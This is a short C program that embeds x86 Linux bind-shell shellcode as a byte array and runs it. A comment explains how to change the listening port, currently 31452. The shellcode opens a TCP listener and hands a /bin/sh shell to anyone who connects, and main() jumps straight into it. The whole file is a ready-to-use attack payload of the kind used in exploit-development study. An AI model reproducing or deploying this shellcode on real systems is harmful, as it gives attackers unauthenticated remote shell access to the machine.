#include<stdio.h>
#include<string.h>

// Shell bind tcp shellcode. Change the 3rd line to listen on diff. port 
// currenlty (0x7adc=31452)
unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc2\x31\xc0\x31\xf6\xb0\x66\xfe\xc3\x56\x56\x56\x66\x68"
"\x7a\xdc"
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc0\xb0\x66"
"\x83\xc3\x02\x6a\x0f\x52\x89\xe1\xcd\x80\x31\xc0\xb0\x66\xfe\xc3\x56\x56"
"\x52\x89\xe1\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();
}

	